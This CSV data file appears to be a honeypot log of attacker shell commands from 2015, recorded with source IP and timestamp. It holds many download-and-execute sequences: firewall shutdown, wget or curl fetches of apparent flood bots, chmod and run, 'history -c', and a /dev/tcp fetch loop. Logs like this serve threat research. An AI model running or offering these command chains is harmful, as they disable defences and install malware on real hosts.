ip,timestamp,input
"61.183.19.52","2015-09-16 14:15:08","service iptables stop"
"61.183.19.52","2015-09-16 14:15:08","SuSEfirewall2 stop"
"61.183.19.52","2015-09-16 14:15:08","reSuSEfirewall2 stop"
"61.183.19.52","2015-09-16 14:15:08","wget -c http://***.***.***.***/l"
"61.183.19.52","2015-09-16 14:15:08","chmod 777 l"
"61.183.19.52","2015-09-16 14:15:08","./l"
"188.190.44.56","2015-09-16 15:32:57","echo -n test"
"188.190.44.56","2015-09-16 15:36:40","echo -n test"
"159.203.77.206","2015-09-16 21:33:57","echo -n test"
"101.100.176.33","2015-09-16 22:00:26","echo -n test"
"101.100.176.33","2015-09-16 22:03:25","echo -n test"
"183.60.202.2","2015-09-17 03:07:03","w"
"201.150.149.245","2015-09-17 10:52:46","echo -n test"
"201.150.149.245","2015-09-17 10:54:19","echo -n test"
"103.19.149.125","2015-09-18 20:35:19","echo -n test"
"103.19.149.125","2015-09-18 20:38:54","echo -n test"
"191.102.73.192","2015-09-18 23:36:50","echo -n test"
"191.102.73.192","2015-09-18 23:40:18","echo -n test"
"201.76.114.153","2015-09-19 02:53:29","echo -n test"
"201.76.114.153","2015-09-19 02:57:37","echo -n test"
"222.186.190.233","2015-09-19 04:14:42","wget -O /tmp/syn25000 http://***.***.***.***/syn25000"
"222.186.190.233","2015-09-19 04:15:02","chmod 0755 /syn25000"
"95.52.249.167","2015-09-19 05:42:43","echo -n test"
"95.52.249.167","2015-09-19 05:45:07","echo -n test"
"5.129.229.181","2015-09-19 06:00:22","echo -n test"
"5.129.229.181","2015-09-19 06:03:51","echo -n test"
"65.87.255.100","2015-09-19 09:43:13","echo -n test"
"65.87.255.100","2015-09-19 09:47:01","echo -n test"
"2.142.68.122","2015-09-19 10:32:05","echo -n test"
"2.142.68.122","2015-09-19 10:33:33","echo -n test"
"37.78.130.150","2015-09-19 19:25:48","echo -n test"
"37.78.130.150","2015-09-19 19:28:56","echo -n test"
"62.46.164.133","2015-09-20 03:01:42","echo -n test"
"58.152.65.11","2015-09-20 03:02:36","echo -n test"
"58.152.65.11","2015-09-20 03:03:13","echo -n test"
"86.104.241.19","2015-09-20 06:46:46","echo -n test"
"86.104.241.19","2015-09-20 06:50:42","echo -n test"
"118.193.13.250","2015-09-20 23:22:29","service iptables stop"
"118.193.13.250","2015-09-21 03:15:52","service iptables stop"
"118.193.13.250","2015-09-21 03:31:10","service iptables stop"
"118.193.13.250","2015-09-21 05:29:16","service iptables stop"
"14.122.91.184","2015-09-22 04:14:03","echo -n test"
"14.122.91.184","2015-09-22 04:17:04","echo -n test"
"14.122.109.102","2015-09-23 22:44:04","echo -n test"
"14.122.109.102","2015-09-23 22:47:36","echo -n test"
"46.226.71.1","2015-09-24 05:54:18","echo -n test"
"46.226.71.1","2015-09-24 05:57:17","echo -n test"
"94.124.246.45","2015-09-24 10:03:10","echo -n test"
"94.124.246.45","2015-09-24 10:06:40","echo -n test"
"200.215.174.112","2015-09-25 02:08:35","echo -n test"
"200.215.174.112","2015-09-25 02:12:07","echo -n test"
"109.175.29.1","2015-09-25 02:43:00","echo -n test"
"109.175.29.1","2015-09-25 02:46:47","echo -n test"
"31.8.150.43","2015-09-25 19:56:46","echo -n test"
"31.8.150.43","2015-09-25 19:59:39","echo -n test"
"91.196.250.6","2015-09-26 04:43:10","echo -n test"
"91.196.250.6","2015-09-26 04:46:31","echo -n test"
"103.60.197.58","2015-09-26 09:13:48","echo -n test"
"103.60.197.58","2015-09-26 09:17:18","echo -n test"
"74.197.85.49","2015-09-26 11:02:05","echo -n test"
"74.197.85.49","2015-09-26 11:05:22","echo -n test"
"121.56.23.240","2015-09-26 23:10:30","echo -n test"
"198.55.106.196","2015-09-27 03:52:52","wget -O /tmp/dos32 http://***.***.***.***/dos32"
"198.55.106.196","2015-09-27 03:53:06","wget -O /tmp/dos32 http://***.***.***.***/dos32"
"117.21.227.81","2015-09-27 04:04:35","wget -O /tmp/32 http://***.***.***.***/32"
"175.5.38.209","2015-09-27 10:02:14","wget http://***.***.***.***/10771"
"175.5.38.209","2015-09-27 10:02:14","chmod 0755 10771"
"175.5.38.209","2015-09-27 10:02:14","./10771"
"175.5.38.209","2015-09-27 10:02:14","history -c"
"175.5.38.209","2015-09-27 10:02:46","wget http://***.***.***.***/10771"
"175.5.38.209","2015-09-27 10:02:46","chmod 0755 10771"
"175.5.38.209","2015-09-27 10:02:46","./10771"
"175.5.38.209","2015-09-27 10:02:46","history -c"
"222.186.30.160","2015-09-27 14:41:04","/etc/init.d/iptables stop"
"222.186.30.160","2015-09-27 14:41:09","service iptables stop"
"222.186.30.160","2015-09-27 14:41:15","wget http://***.***.***.***/Chinaz.zip"
"222.186.30.160","2015-09-27 14:41:22","./Chinaz.zip &"
"121.40.35.36","2015-09-27 15:49:49","/etc/init.d/iptables stop"
"121.40.35.36","2015-09-27 15:49:53","service iptables stop"
"121.40.35.36","2015-09-27 15:49:57","wget http://***.***.***.***/china.zip"
"46.73.64.212","2015-09-27 21:47:21","echo -n test"
"121.40.35.36","2015-09-27 21:48:22","/etc/init.d/iptables stop"
"121.40.35.36","2015-09-27 21:48:26","wget http://***.***.***.***/win24.zip"
"121.40.35.36","2015-09-27 21:48:34","chmod u+x win24.zip"
"121.40.35.36","2015-09-27 21:48:38","./win24.zip &"
"121.40.35.36","2015-09-27 21:48:42","wget http://***.***.***.***/winsyn.zip"
"121.40.35.36","2015-09-27 21:48:54","/root/winsyn.zip"
"121.40.35.36","2015-09-27 21:48:58","./winsyn.zip &"
"46.73.64.212","2015-09-27 21:51:08","echo -n test"
"185.40.225.63","2015-09-28 00:28:59","echo -n test"
"185.40.225.63","2015-09-28 00:32:53","echo -n test"
"198.55.106.231","2015-09-28 05:32:47","wget -O /tmp/32 http://***.***.***.***/32"
"177.125.158.233","2015-09-28 13:57:59","echo -n test"
"177.125.158.233","2015-09-28 14:02:01","echo -n test"
"151.233.220.255","2015-09-29 00:15:30","echo -n test"
"151.233.220.255","2015-09-29 00:18:40","echo -n test"
"5.190.97.98","2015-09-29 10:22:05","echo -n test"
"5.190.97.98","2015-09-29 10:25:42","echo -n test"
"107.6.45.136","2015-09-30 01:10:23","wget http://***.***.***.***/xudp"
"107.6.45.136","2015-09-30 01:10:53","wget http://***.***.***.***/xudp"
"121.40.35.36","2015-09-30 15:04:56","/etc/init.d/iptables stop"
"121.40.35.36","2015-09-30 15:05:00","service iptables stop"
"121.40.35.36","2015-09-30 15:05:04","wget http://***.***.***.***/Chinaz.zip"
"121.40.35.36","2015-09-30 15:05:12","./Chinaz.zip &"
"121.40.35.36","2015-09-30 15:05:16","wget http://***.***.***.***/win24.zip"
"121.40.35.36","2015-09-30 15:05:24","chmod u+x win24.zip"
"121.40.35.36","2015-09-30 15:05:28","./win24.zip &"
"121.40.35.36","2015-09-30 15:05:32","wget http://***.***.***.***/winsyn.zip"
"121.40.35.36","2015-09-30 15:05:40","chmod u+x winsyn.zip"
"121.40.35.36","2015-09-30 15:05:44","/root/winsyn.zip"
"121.40.35.36","2015-09-30 15:05:48","./winsyn.zip &"
"121.40.35.36","2015-09-30 15:05:52","wget http://***.***.***.***/china.zip"
"111.49.157.156","2015-10-01 15:05:20","echo -n test"
"111.49.157.156","2015-10-01 15:08:38","echo -n test"
"61.160.207.131","2015-10-01 15:24:30","service iptables stop"
"61.160.207.131","2015-10-01 15:24:36","wget http://***.***.***.***/Chinaz.zip"
"61.160.207.131","2015-10-01 15:24:40","chmod 777 Chinaz.zip"
"61.160.207.131","2015-10-01 15:24:45","./Chinaz.zip &"
"61.160.207.131","2015-10-01 15:24:51","wget http://***.***.***.***/china.zip"
"61.160.207.131","2015-10-01 15:25:00","./china.zip &"
"23.91.15.219","2015-10-02 07:21:31","service iptables stop"
"23.91.15.219","2015-10-02 07:22:00","service iptables stop"
"59.63.188.45","2015-10-02 19:35:52","date +\"%F %T\""
"59.63.188.45","2015-10-02 19:35:52","uname -srm"
"59.63.188.45","2015-10-02 19:35:52","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid"
"59.63.188.45","2015-10-02 19:35:52","(whomai)"
"59.63.188.45","2015-10-02 19:37:22","sleep 1"
"59.63.188.45","2015-10-02 19:37:22","(cat /var/run/gcc.pid >/dev/null || cat /var/run/mount.pid >/dev/null || cat/var/run/sftp.pid >/dev/null ) && echo install"
"59.63.188.45","2015-10-02 19:38:37","curl --connect-timeout 30 -O http://***.***.***.***/6004.rar  && echo curldownload"
"59.63.188.45","2015-10-02 19:38:37","chmod +x 6004.rar"
"59.63.188.45","2015-10-02 19:38:37","./6004.rar"
"59.63.188.45","2015-10-02 19:38:37","rm -f 6004.rar"
"59.63.188.45","2015-10-02 19:38:52","wget --timeout=30 -O 6004.rar http://***.***.***.***/6004.rar && echo wgetdownload"
"59.63.188.45","2015-10-02 19:38:52","chmod +x 6004.rar"
"59.63.188.45","2015-10-02 19:38:52","./6004.rar"
"59.63.188.45","2015-10-02 19:38:52","rm -f 6004.rar"
"59.63.188.45","2015-10-02 19:39:07","rm -f 6004"
"59.63.188.45","2015-10-02 19:39:07","(exec 3<>/dev/tcp/211.110.1.32/80 && echo \"GET /6004.rar\" >&3 && (cat <&3 >6004 &) && for((i=0"
"59.63.188.45","2015-10-02 19:39:07","i<60"
"59.63.188.45","2015-10-02 19:39:07","i++))"
"59.63.188.45","2015-10-02 19:39:07","do chmod +x 6004 && ./6004 && break"
"59.63.188.45","2015-10-02 19:39:07","sleep 1"
"59.63.188.45","2015-10-02 19:39:07","done"
"59.63.188.45","2015-10-02 19:39:07",") && echo execdownload && exec 3>&- && exec 3<&-"
"59.63.188.45","2015-10-02 19:40:37","/fuck && echo sftpdownload"
"59.63.188.45","2015-10-02 19:42:05","ps -e"
"59.63.188.45","2015-10-02 19:42:05","netstat -ntp"
"59.63.188.45","2015-10-02 19:48:36","(date +\"%F %T\""
"59.63.188.45","2015-10-02 19:48:36","uname -srm"
"59.63.188.45","2015-10-02 19:48:37","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid)"
"59.63.188.45","2015-10-02 19:48:52","sleep 1"
"59.63.188.45","2015-10-02 19:48:52","(cat /var/run/gcc.pid >/dev/null || cat /var/run/mount.pid >/dev/null || cat/var/run/sftp.pid >/dev/null ) && echo install"
"59.63.188.45","2015-10-02 19:50:12","curl --connect-timeout 30 -O http://***.***.***.***/6004.rar  && echo curldownload"
"59.63.188.45","2015-10-02 19:50:12","chmod +x 6004.rar"
"59.63.188.45","2015-10-02 19:50:12","./6004.rar"
"59.63.188.45","2015-10-02 19:50:12","rm -f 6004.rar"
"59.63.188.45","2015-10-02 19:50:42","wget --timeout=30 -O 6004.rar http://***.***.***.***/6004.rar && echo wgetdownload"
"59.63.188.45","2015-10-02 19:50:42","chmod +x 6004.rar"
"59.63.188.45","2015-10-02 19:50:42","./6004.rar"
"59.63.188.45","2015-10-02 19:50:42","rm -f 6004.rar"
"59.63.188.45","2015-10-02 19:51:12","rm -f 6004"
"59.63.188.45","2015-10-02 19:51:12","(exec 3<>/dev/tcp/211.110.1.32/80 && echo \"GET /6004.rar\" >&3 && (cat <&3 >6004 &) && for((i=0"
"59.63.188.45","2015-10-02 19:51:12","i<60"
"59.63.188.45","2015-10-02 19:51:13","i++))"
"59.63.188.45","2015-10-02 19:51:13","do chmod +x 6004 && ./6004 && break"
"59.63.188.45","2015-10-02 19:51:13","sleep 1"
"59.63.188.45","2015-10-02 19:51:13","done"
"59.63.188.45","2015-10-02 19:51:13",") && echo execdownload && exec 3>&- && exec 3<&-"
"59.63.188.45","2015-10-02 19:52:40","/fuck && echo sftpdownload"
"59.63.188.45","2015-10-02 19:53:55","ps -e"
"59.63.188.45","2015-10-02 19:53:55","netstat -ntp"
"59.63.188.45","2015-10-02 22:35:54","(date +\"%F %T\""
"59.63.188.45","2015-10-02 22:35:54","uname -srm"
"59.63.188.45","2015-10-02 22:35:54","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid)"
"59.63.188.45","2015-10-02 22:47:48","(date +\"%F %T\""
"59.63.188.45","2015-10-02 22:47:48","uname -srm"
"59.63.188.45","2015-10-02 22:47:48","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid)"
"59.63.188.45","2015-10-02 23:44:35","(date +\"%F %T\""
"59.63.188.45","2015-10-02 23:44:35","uname -srm"
"59.63.188.45","2015-10-02 23:44:35","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid)"
"59.63.188.45","2015-10-03 00:53:51","(date +\"%F %T\""
"59.63.188.45","2015-10-03 00:53:51","uname -srm"
"59.63.188.45","2015-10-03 00:53:51","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid)"
"59.63.188.45","2015-10-03 02:56:30","(date +\"%F %T\""
"59.63.188.45","2015-10-03 02:56:30","uname -srm"
"59.63.188.45","2015-10-03 02:56:30","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid)"
"59.63.188.45","2015-10-03 03:49:31","(date +\"%F %T\""
"59.63.188.45","2015-10-03 03:49:31","uname -srm"
"59.63.188.45","2015-10-03 03:49:31","rm -rf /var/run/gcc.pid /var/run/mount.pid /var/run/sftp.pid)"
"103.224.166.10","2015-10-03 18:53:43","echo -n test"
"103.224.166.10","2015-10-03 18:56:51","echo -n test"
"200.9.136.197","2015-10-04 13:59:44","echo -n test"
"200.9.136.197","2015-10-04 14:03:11","echo -n test"
"112.74.66.152","2015-10-04 18:29:44","wget http://***.***.***.***/.TSm"
"43.224.180.45","2015-10-05 06:52:31","echo -n test"
"43.224.180.45","2015-10-05 06:56:22","echo -n test"
"176.50.141.244","2015-10-06 05:56:21","echo -n test"
"176.50.141.244","2015-10-06 05:58:00","echo -n test"
"118.193.13.250","2015-10-06 11:24:29","service iptables stop"
"118.193.13.250","2015-10-06 11:24:44","service iptables stop"
"194.50.141.47","2015-10-06 20:38:57","echo -n test"
"168.167.133.66","2015-10-06 20:39:29","echo -n test"
"94.205.232.124","2015-10-06 20:40:45","echo -n test"
"168.167.133.66","2015-10-06 20:41:54","echo -n test"
"194.50.141.47","2015-10-06 20:42:26","echo -n test"
"94.205.232.124","2015-10-06 20:44:11","echo -n test"
"94.232.207.106","2015-10-06 21:24:40","echo -n test"
"94.232.207.106","2015-10-06 21:26:24","echo -n test"
"223.4.239.227","2015-10-06 22:50:50","/etc/init.d/iptables stop"
"223.4.239.227","2015-10-06 22:50:50","service iptables stop"
"223.4.239.227","2015-10-06 22:50:51","SuSEfirewall2 stop"
"223.4.239.227","2015-10-06 22:50:51","reSuSEfirewall2 stop"
"223.4.239.227","2015-10-06 22:50:51","wget -c http://***.***.***.***/l"
"223.4.239.227","2015-10-06 22:50:51","chmod 777 l"
"223.4.239.227","2015-10-06 22:50:51","./l"
"110.74.222.168","2015-10-07 02:22:52","echo -n test"
"110.74.222.168","2015-10-07 02:25:53","echo -n test"
"183.131.85.109","2015-10-07 05:12:47","wget -O /tmp/32 http://***.***.***.***/32"
"183.37.189.169","2015-10-07 19:20:46","echo -n test"
"183.37.189.169","2015-10-07 19:23:46","echo -n test"
"154.0.136.92","2015-10-08 10:26:48","echo -n test"
"154.0.136.92","2015-10-08 10:30:34","echo -n test"
"66.56.201.117","2015-10-08 17:44:22","echo -n test"
"91.60.226.71","2015-10-08 17:45:39","echo -n test"
"66.56.201.117","2015-10-08 17:47:23","echo -n test"
"91.60.226.71","2015-10-08 17:48:51","echo -n test"
"176.50.137.197","2015-10-09 11:17:27","echo -n test"
"176.50.137.197","2015-10-09 11:19:10","echo -n test"
"103.48.64.10","2015-10-09 13:24:05","echo -n test"
"103.48.64.10","2015-10-09 13:27:16","echo -n test"
"220.233.38.76","2015-10-09 15:11:51","echo -n test"
"220.233.38.76","2015-10-09 15:14:01","echo -n test"
"84.0.214.188","2015-10-09 16:18:32","echo -n test"
"84.0.214.188","2015-10-09 16:22:06","echo -n test"
"197.231.199.243","2015-10-09 16:26:05","echo -n test"
"222.243.243.182","2015-10-09 17:55:40","wget http://***.***.***.***/10771"
"222.243.243.182","2015-10-09 17:55:40","chmod 0755 10771"
"222.243.243.182","2015-10-09 17:55:40","./10771"
"222.243.243.182","2015-10-09 17:55:40","history -c"
"121.12.170.193","2015-10-10 01:19:02","wget -O /tmp/duge-syn http://***.***.***.***/duge-syn"
"121.12.170.193","2015-10-10 01:19:06","chmod 777 /duge-syn"
"121.12.170.193","2015-10-10 01:19:10","nohup /tmp/duge-syn > /dev/null 2>&1 &"
"121.12.170.193","2015-10-10 01:19:14","exit"
"121.12.170.193","2015-10-10 01:52:53","wget -O /tmp/duge-udp http://***.***.***.***/duge-udp"
"121.12.170.193","2015-10-10 01:52:56","chmod 777 /duge-udp"
"121.12.170.193","2015-10-10 01:53:00","nohup /tmp/duge-udp > /dev/null 2>&1 &"
"121.12.170.193","2015-10-10 01:53:04","exit"
"121.12.170.193","2015-10-10 03:35:51","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-10 03:35:56","chmod 777 /ssd"
"121.12.170.193","2015-10-10 03:35:59","nohup /tmp/ssd > /dev/null 2>&1 &"
"121.12.170.193","2015-10-10 03:36:02","exit"
"220.170.120.155","2015-10-10 15:45:48","wget http://***.***.***.***/10771"
"220.170.120.155","2015-10-10 15:45:49","chmod 0755 10771"
"220.170.120.155","2015-10-10 15:45:49","./10771"
"220.170.120.155","2015-10-10 15:45:49","history -c"
"121.12.170.193","2015-10-10 18:40:09","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-10 18:40:12","chmod 777 /ssd"
"121.12.170.193","2015-10-10 18:40:17","nohup /tmp/ssd > /dev/null 2>&1 &"
"121.12.170.193","2015-10-10 18:40:20","exit"
"121.12.170.193","2015-10-10 18:54:47","wget http://***.***.***.***/ssd"
"121.12.170.193","2015-10-10 18:54:50","chmod 777 ssd"
"121.12.170.193","2015-10-10 18:54:53","./ssd"
"121.12.170.193","2015-10-10 19:13:04","wget http://***.***.***.***/ssd"
"121.12.170.193","2015-10-10 19:13:07","chmod 777 ssd"
"121.12.170.193","2015-10-10 19:13:10","./ssd"
"121.12.170.193","2015-10-10 19:32:23","chmod 777 ssd"
"121.12.170.193","2015-10-10 19:32:26","./ssd"
"121.12.170.193","2015-10-10 19:39:03","wget http://***.***.***.***/duge-syn"
"121.12.170.193","2015-10-10 19:39:06","chmod 777 duge-syn"
"121.12.170.193","2015-10-10 19:39:09","./duge-syn"
"121.12.170.193","2015-10-10 19:59:01","chmod 777 ssd"
"121.12.170.193","2015-10-10 19:59:04","./ssd"
"200.1.212.34","2015-10-10 23:52:25","echo -n test"
"200.1.212.34","2015-10-10 23:55:54","echo -n test"
"121.12.170.193","2015-10-11 00:19:02","wget http://***.***.***.***/ssd"
"121.12.170.193","2015-10-11 00:19:05","chmod 777 ssd"
"121.12.170.193","2015-10-11 00:19:08","./ssd"
"121.12.170.193","2015-10-11 00:44:50","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-11 00:44:53","chmod 777 /ssd"
"121.12.170.193","2015-10-11 00:44:56","nohup /tmp/ssd > /dev/null 2>&1 &"
"121.12.170.193","2015-10-11 01:03:48","chmod 777 ssd"
"121.12.170.193","2015-10-11 01:03:51","./ssd"
"121.12.170.193","2015-10-11 01:22:53","chmod 777 ssd"
"121.12.170.193","2015-10-11 01:22:56","./ssd"
"121.12.170.193","2015-10-11 02:14:18","chmod 777 ssd"
"121.12.170.193","2015-10-11 02:14:21","./ssd"
"121.12.170.193","2015-10-11 03:24:10","wget http://***.***.***.***/ssd"
"121.12.170.193","2015-10-11 03:24:13","chmod 777 ssd"
"121.12.170.193","2015-10-11 03:24:16","./ssd"
"95.110.22.103","2015-10-11 06:20:36","echo -n test"
"95.110.22.103","2015-10-11 06:22:03","echo -n test"
"138.186.26.246","2015-10-11 07:52:09","echo -n test"
"138.186.26.246","2015-10-11 07:55:40","echo -n test"
"221.160.230.202","2015-10-11 09:42:41","echo -n test"
"221.160.230.202","2015-10-11 09:43:22","echo -n test"
"221.160.230.202","2015-10-11 09:43:55","echo -n test"
"221.160.230.202","2015-10-11 09:44:47","echo -n test"
"69.43.218.73","2015-10-11 09:58:49","echo -n test"
"193.226.223.154","2015-10-11 09:59:12","echo -n test"
"69.156.234.12","2015-10-11 09:59:30","echo -n test"
"69.43.218.73","2015-10-11 10:01:32","echo -n test"
"193.226.223.154","2015-10-11 10:02:18","echo -n test"
"69.156.234.12","2015-10-11 10:02:51","echo -n test"
"194.158.72.202","2015-10-11 15:24:13","echo -n test"
"194.158.72.202","2015-10-11 15:27:26","echo -n test"
"222.186.30.160","2015-10-11 17:37:04","/etc/init.d/iptables stop"
"222.186.30.160","2015-10-11 17:37:08","wget http://***.***.***.***/chinae.rar"
"222.186.30.160","2015-10-11 17:37:16","./chinae.rar &"
"222.186.30.160","2015-10-11 17:37:20","wget http://***.***.***.***/cesi1.rar"
"222.186.30.160","2015-10-11 17:37:32","wget http://***.***.***.***/cesi2.rar"
"222.186.30.160","2015-10-11 17:37:40","./cesi2.rar &"
"222.186.30.160","2015-10-11 17:37:44","wget http://***.***.***.***/win24.zip"
"222.186.30.160","2015-10-11 17:38:00","wget http://***.***.***.***/winsyn.zip"
"222.186.30.160","2015-10-11 17:38:08","chmod u+x winsyn.zip"
"222.186.30.160","2015-10-11 17:38:12","/root/winsyn.zip"
"222.186.30.160","2015-10-11 17:38:16","./winsyn.zip &"
"176.50.167.130","2015-10-11 20:13:11","echo -n test"
"176.50.167.130","2015-10-11 20:15:42","echo -n test"
"121.12.170.193","2015-10-11 21:51:37","wget -O /tmpt/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-11 21:51:40","chmod 777 /ssd"
"121.12.170.193","2015-10-11 21:51:44","nohup /tmp/ssd > /dev/null 2>&1 &"
"121.12.170.193","2015-10-11 22:12:08","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-11 22:12:12","cd /tmp"
"121.12.170.193","2015-10-11 22:12:16","chmod 777 ./ssd"
"121.12.170.193","2015-10-11 22:12:20","./ssd"
"121.12.170.193","2015-10-11 22:12:24","exit"
"121.12.170.193","2015-10-11 22:42:53","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-11 22:42:56","cd /tmp"
"121.12.170.193","2015-10-11 22:43:00","chmod 0755 ./ssd"
"121.12.170.193","2015-10-11 22:43:04","./ssd"
"121.12.170.193","2015-10-11 22:43:08","exit"
"59.56.110.233","2015-10-11 23:17:13","/etc/init.d/iptables stop"
"59.56.110.233","2015-10-11 23:17:17","wget http://***.***.***.***/cesi2.rar"
"59.56.110.233","2015-10-11 23:17:25","./cesi2.rar &"
"118.92.211.187","2015-10-12 00:13:45","echo -n test"
"73.246.116.219","2015-10-12 00:16:56","echo -n test"
"223.4.217.102","2015-10-12 00:42:40","wget -O /tmp/ls360 http://***.***.***.***/ls360"
"223.4.217.102","2015-10-12 00:42:44","chmod 0755 /ls360"
"223.4.217.102","2015-10-12 00:42:48","nohup /tmp/ls360 > /dev/null 2>&1 &"
"223.4.217.102","2015-10-12 00:42:52","exit"
"223.4.217.102","2015-10-12 00:51:04","wget -O /tmp/ls360 http://***.***.***.***/ls360"
"223.4.217.102","2015-10-12 00:51:07","chmod 0755 /ls360"
"223.4.217.102","2015-10-12 00:51:11","nohup /tmp/ls360 > /dev/null 2>&1 &"
"223.4.217.102","2015-10-12 00:51:15","exit"
"223.4.217.102","2015-10-12 00:55:58","wget -O /tmp/ls1 http://***.***.***.***/ls1"
"223.4.217.102","2015-10-12 00:56:02","chmod 0755 /ls1"
"223.4.217.102","2015-10-12 00:56:06","nohup /tmp/ls1 > /dev/null 2>&1 &"
"223.4.217.102","2015-10-12 00:56:10","exit"
"78.72.243.240","2015-10-12 01:43:43","echo -n test"
"78.72.243.240","2015-10-12 01:47:08","echo -n test"
"121.12.170.193","2015-10-12 04:28:31","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-12 04:28:35","cd /tmp"
"121.12.170.193","2015-10-12 04:28:39","chmod 0755 ./ssd"
"121.12.170.193","2015-10-12 04:28:43","./ssd"
"121.12.170.193","2015-10-12 04:28:47","exit"
"121.12.170.193","2015-10-12 05:00:27","wget -O /tmp/ssd http://***.***.***.***/duge-syn"
"121.12.170.193","2015-10-12 05:00:30","cd /tmp"
"121.12.170.193","2015-10-12 05:00:35","chmod 0755 ./duge-syn"
"121.12.170.193","2015-10-12 05:00:38","./duge-syn"
"121.12.170.193","2015-10-12 05:00:42","exit"
"121.12.170.193","2015-10-12 05:34:50","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-12 05:34:54","cd /tmp"
"121.12.170.193","2015-10-12 05:34:58","chmod 0755 ./ssd"
"121.12.170.193","2015-10-12 05:35:02","./ssd"
"121.12.170.193","2015-10-12 05:35:06","exit"
"121.12.170.193","2015-10-12 05:59:15","wget http://***.***.***.***/wyh-syn"
"121.12.170.193","2015-10-12 05:59:18","chmod 777 wyh-syn"
"121.12.170.193","2015-10-12 05:59:22","./wyh-syn"
"121.12.170.193","2015-10-12 06:04:57","wget -O /tmp/duge-syn http://***.***.***.***/duge-syn"
"121.12.170.193","2015-10-12 06:05:01","cd /tmp"
"121.12.170.193","2015-10-12 06:05:05","chmod 777 ./duge-syn"
"121.12.170.193","2015-10-12 06:05:09","./duge-syn"
"121.12.170.193","2015-10-12 06:05:13","exit"
"121.12.170.193","2015-10-12 06:10:20","wget -O /tmp/duge-udp http://***.***.***.***/duge-udp"
"121.12.170.193","2015-10-12 06:10:23","cd /tmp"
"121.12.170.193","2015-10-12 06:10:27","chmod 777 ./duge-udp"
"121.12.170.193","2015-10-12 06:10:31","./duge-udp"
"121.12.170.193","2015-10-12 06:10:35","exit"
"121.12.170.193","2015-10-12 06:22:51","wget -O /tmp/duge-udp http://***.***.***.***/duge-udp"
"121.12.170.193","2015-10-12 06:22:55","cd /tmp"
"121.12.170.193","2015-10-12 06:22:59","chmod 777 ./duge-udp"
"121.12.170.193","2015-10-12 06:23:03","./duge-udp"
"121.12.170.193","2015-10-12 06:23:07","exit"
"121.12.170.193","2015-10-12 06:32:29","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-12 06:32:33","cd /tmp"
"121.12.170.193","2015-10-12 06:32:37","chmod 777 ./ssd"
"121.12.170.193","2015-10-12 06:32:41","./ssd"
"121.12.170.193","2015-10-12 06:32:45","exit"
"121.12.170.193","2015-10-12 06:52:45","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-12 06:52:48","cd /tmp"
"121.12.170.193","2015-10-12 06:52:53","chmod 777 ./ssd"
"121.12.170.193","2015-10-12 06:52:56","./ssd"
"121.12.170.193","2015-10-12 06:53:00","exit"
"121.12.170.193","2015-10-12 07:00:26","wget -O /tmp/ssd http://***.***.***.***/ssd"
"121.12.170.193","2015-10-12 07:00:38","cd /tmp"
"121.12.170.193","2015-10-12 07:00:50","chmod 777 ./ssd"
"121.12.170.193","2015-10-12 07:01:02","./ssd"
"121.12.170.193","2015-10-12 07:01:14","exit"
"177.87.104.74","2015-10-12 09:05:45","echo -n test"
"177.87.104.74","2015-10-12 09:09:32","echo -n test"
"59.56.110.233","2015-10-12 12:47:54","/etc/init.d/iptables stop"
"59.56.110.233","2015-10-12 12:47:58","wget http://***.***.***.***/chinae.rar"
"59.56.110.233","2015-10-12 12:48:06","./chinae.rar &"
"59.56.110.233","2015-10-12 12:48:10","wget http://***.***.***.***/cesi2.rar"
"59.56.110.233","2015-10-12 12:48:18","./cesi2.rar &"
